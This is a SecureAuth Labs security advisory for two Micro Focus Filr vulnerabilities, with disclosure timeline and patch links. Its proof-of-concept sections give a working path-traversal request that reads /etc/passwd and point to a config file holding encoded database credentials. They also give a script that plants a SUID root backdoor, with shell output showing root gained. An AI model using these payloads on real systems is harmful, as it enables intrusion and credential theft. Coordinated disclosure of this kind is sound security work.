@@ -1,0 +1,298 @@
+SecureAuth - SecureAuth Labs Advisory
+http://www.secureauth.com/
+
+Micro Focus Filr Multiple Vulnerabilities
+
+1. *Advisory Information*
+
+Title: Micro Focus Filr Multiple Vulnerabilities
+Advisory ID: SAUTH-2019-0001
+Advisory URL: https://www.secureauth.com/labs/advisories/micro-focus-filr-multiple-vulnerabilities
+Date published: 2019-02-20
+Date of last update: 2019-02-20
+Vendors contacted: Micro Focus
+Release mode: Coordinated release
+
+2. *Vulnerability Information*
+
+Class: Path traversal [CWE-22], Permissions, Privileges, and Access
+Control [CWE-264]
+Impact: Security bypass, Information leak
+Remotely Exploitable: Yes
+Locally Exploitable: Yes
+CVE Name: CVE-2019-3474, CVE-2019-3475
+
+3. *Vulnerability Description*
+
+Novell (now part of Micro Focus [1]) website states that:
+Micro Focus Filr [2] provides file access and sharing, and lets users
+access their home directories and network folders from desktops, mobile
+devices, and the Web. Users can also synchronize their files to their PC
+or Mac. Changes that they make to downloaded copies are kept in sync
+with the originals on their network file servers. And finally, users can
+also share files internally and externally, and those with the share can
+collaborate with each other by commenting on the files.
+
+A vulnerability was found in the Micro Focus Filr Appliance, which would
+allow an attacker with regular user access to read arbitrary files of
+the filesystem. Furthermore, a vulnerability in the famtd daemon could
+allow a local attacker to elevate privileges.
+
+4. *Vulnerable Packages*
+
+. Micro Focus Filr 3.4.0.217.
+. Older versions are probably affected too, but they were not checked.
+
+5. *Vendor Information, Solutions and Workarounds*
+
+Micro Focus released Filr 3.0 Security Update 6 that addresses the
+reported issues: https://download.novell.com/Download?buildid=nZUCSDkvpxk~
+
+Also, Micro Focus published the following Security Notes:
+
+. https://support.microfocus.com/kb/doc.php?id=7023726
+. https://support.microfocus.com/kb/doc.php?id=7023727
+
+6. *Credits*
+
+These vulnerabilities were discovered and researched by Matias Choren
+from SecureAuth. The publication of this advisory was coordinated by
+Leandro Cuozzo from SecureAuth Advisories Team.
+
+7. *Technical Description / Proof of Concept Code*
+
+7.1. *Path Traversal*
+
+[CVE-2019-3474]
+The 'filename' parameter of the '/ssf/f/viewFile' endpoint is vulnerable
+to Path Traversal attacks. An authenticated, low-privileged user may be
+able to abuse this functionality in order to read arbitrary files on the
+filesystem.
+
+Proof of Concept:
+
+
+1. As an authenticated user, upload a sample PDF file in the 'My Files'
+section.
+2. After the upload finishes, click on the small arrow next to the file
+-> 'View Details'.
+3. The browser will issue a few requests to the web application, one of
+them being the one used for displaying the thumbnail of the file we've
+just uploaded. This request has the following structure:
+
+/-----
+GET
+/ssf/s/viewFile?binderId=44&entryId=1&entityType=folderEntry&fileId=8a82ada06851d92d016852b727f26b1b&viewType=image&filename=t154758084657912375035546628304890001.jpg
+-----/
+
+4. If the 'viewType' parameter is set to 'image', as in this case, we
+can escape the current directory and include arbitrary files, as long as
+they are readable by the 'wwwrun' user (the user Apache Tomcat is
+currently running as). For example, we could read the '/etc/passwd' file:
+
+/-----
+GET
+/ssf/s/viewFile?binderId=44&entryId=1&entityType=folderEntry&fileId=8a82ada06851d92d016852b727f26b1b&viewType=image&filename=../../../../../../../../../../../etc/passwd
+HTTP/1.1
+Host: 10.2.45.32:8443
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101
+Firefox/60.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: JSESSIONID=803689DA9BA5DA9CBA2B7DD246A50531
+Connection: close
+-----/
+
+/-----
+HTTP/1.1 200 OK
+Expires: Thu, 01 Jan 1970 00:00:00 GMT
+X-UA-Compatible: IE=Edge
+X-Content-Type-Options: nosniff
+Cache-Control: no-cache
+Strict-Transport-Security: max-age=0
+X-Frame-Options: SAMEORIGIN
+X-XSS-Protection: 1; mode=block
+Content-Type: image/jpeg
+Date: Mon, 21 Jan 2019 14:53:37 GMT
+Connection: close
+Server: Filr
+Content-Length: 1506
+
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/bin/bash
+
+<...>
+-----/
+
+5. Also, an interesting file to look for would be
+'/vastorage/conf/vaconfig.zip'. This zip file contains a bunch of
+different configuration files, including 'mysql-liquibase.properties'
+which, among other things, defines connection parameters such as the
+username and password (base64 encoded) for the MySQL database:
+
+/-----
+referencePassword==?UTF-8?B?Zmlscg==?=
+referenceUrl=jdbc:mysql://localhost:3306/filr?useUnicode=true&characterEncoding=UTF-8
+url=jdbc:mysql://localhost:3306/filr?useUnicode=true&characterEncoding=UTF-8
+password==?UTF-8?B?Zmlscg==?=
+driver=com.mysql.jdbc.Driver
+referenceUsername=filr
+referenceDriver=com.mysql.jdbc.Driver
+username=filr
+-----/
+
+7.2. *Local Privilege Escalation*
+
+[CVE-2019-3475]
+As per the description: 'novell-famtd provide CIFS & NCP file access
+support for Filr server to request and respond to HTTP request coming
+from Filr Client/ Browser'. This daemon runs during startup and can be
+abused to elevate privileges on a Filr appliance.
+
+Proof of Concept:
+
+1. The 'famtd' binary located at '/opt/novell/filr/bin/' and its
+containing folder are owned by the 'wwwrun' user, as can be seen next:
+
+/-----
+wwwrun@filr:/opt/novell/filr/bin> ls -lha
+total 196K
+drwxr-x--- 2 wwwrun www 4,0K ene 21 17:22 .
+drwxr-x--- 8 wwwrun www 4,0K ene 14 18:41 ..
+-rwxr-x--- 1 wwwrun www  23K feb  8  2017 famtconfig
+-rwxr-x--- 1 wwwrun www 117K ene 14 18:19 famtd
+-rwxr-x--- 1 wwwrun www  905 feb  8  2017 famt_log_config.sh
+-rwxr-x--- 1 wwwrun www  31K jun 21  2018 kablink-teaming-tools.jar
+wwwrun@filr:/opt/novell/filr/bin>
+-----/
+
+2. This binary is referenced and later executed in the
+'/etc/init.d/novell-famtd' init script, meaning that it will run with
+root privileges on startup:
+
+/-----
+#
+# /etc/init.d/novell-famtd
+#
+
+<...>
+
+# Check for missing binaries (stale symlinks should not happen)
+# Note: Special treatment of stop for LSB conformance
+FAMT_BIN=/opt/novell/filr/bin/famtd
+
+<...>
+
+## Start daemon with startproc(8). If this fails
+## the return value is set appropriately by startproc.
+ulimit -c unlimited
+/sbin/startproc $FAMT_BIN
+
+<...>
+-----/
+
+3. If an attacker manages to run arbitrary commands on the Filr
+appliance as the 'wwwrun' user, they could replace the
+'/opt/novell/filr/bin/famtd' binary with, for example, a custom bash
+script that writes a SUID backdoor on the filesystem:
+
+/-----
+#!/bin/bash
+
+# C snippet for setting group and user identity to 'root'
+FILE="/tmp/exp.c"
+
+/bin/cat <<EOM >$FILE
+#include <unistd.h>
+
+int main(void) {
+        setgid(0);
+        setuid(0);
+        setegid(0);
+        execl("/bin/bash", "bash", 0);
+}
+EOM
+
+# Compile it
+gcc /tmp/exp.c -o /tmp/exp
+
+# Set suid bit
+chmod -c 4755 /tmp/exp
+
+# Call the original famtd daemon
+/opt/novell/filr/bin/famtd.back
+-----/
+
+4. After a server reboot, we can run '/tmp/exp' and get root privileges
+on the server:
+
+/-----
+wwwrun@filr:/tmp> id
+uid=30(wwwrun) gid=8(www) groups=8(www)
+wwwrun@filr:/tmp> ls -lha
+total 96K
+drwxrwxrwt 18 root         root         4,0K ene 21 17:15 .
+drwxr-xr-x 27 root         root         4,0K ene 21 14:14 ..
+
+<...>
+
+-rwsr-xr-x  1 root         root          12K ene 21 17:14 exp
+-rw-r--r--  1 root         root          137 ene 21 14:14 exp.c
+
+<...>
+
+wwwrun@filr:/tmp> ./exp
+filr:/tmp # id
+uid=0(root) gid=0(root) groups=0(root),8(www)
+filr:/tmp #
+-----/
+
+8. *Report Timeline*
+2019-01-23: SecureAuth sent an initial notification to Micro Focus including a draft advisory.
+2019-01-23: Micro Focus acknowledged reception of initial contact.
+2019-01-24: Micro Focus confirmed the reported vulnerabilities and
+informed that they were aiming to deliver a patch around mid February.
+2019-01-23: SecureAuth thanks the reply.
+2019-02-11: SecureAuth asked for an update.
+2019-02-11: Micro Focus replied saying that they were expecting to release the patch by the end of the week.
+2019-02-11: SecureAuth proposed to set the publication date for next week.
+2019-02-13: Micro Focus confirmed February 20th as the release date.
+2019-02-20: Advisory SAUTH-2019-0001 published.
+
+9. *References*
+
+[1] https://www.microfocus.com/novell/
+[2] https://www.novell.com/documentation/filr-3/filr-overvw/data/what_is_filr.html
+
+10. *About SecureAuth Labs*
+
+SecureAuth Labs, the research arm of SecureAuth Corporation, is charged
+with anticipating the future needs and requirements for information
+security technologies. We conduct research in several important areas of
+computer security, including identity-related attacks, system
+vulnerabilities and cyber-attack planning. Research includes problem
+formalization, identification of vulnerabilities, novel solutions and
+prototypes for new technologies. We regularly publish security
+advisories, primary research, technical publications, research blogs,
+project information, and shared software tools for public use at
+http://www.secureauth.com.
+
+11. *About SecureAuth*
+
+SecureAuth is leveraged by leading companies, their employees, their
+customers and their partners to eliminate identity-related breaches.
+As a leader in access management, SecureAuth is powering an identity
+security revolution by enabling people and devices to intelligently
+and adaptively access systems and data, while effectively keeping bad
+actors from doing harm. By ensuring the continuous assessment of risk
+and enablement of trust, SecureAuth's highly flexible platform makes
+it easier for organizations to prevent the misuse of credentials. To
+learn more, visit www.secureauth.com, call (949) 777-6959,
+or email us at info@secureauth.com
+
+12. *Disclaimer*
+
+The contents of this advisory are copyright (c) 2019 SecureAuth, and are
+licensed under a Creative Commons Attribution Non-Commercial Share-Alike
+3.0 (United States) License:
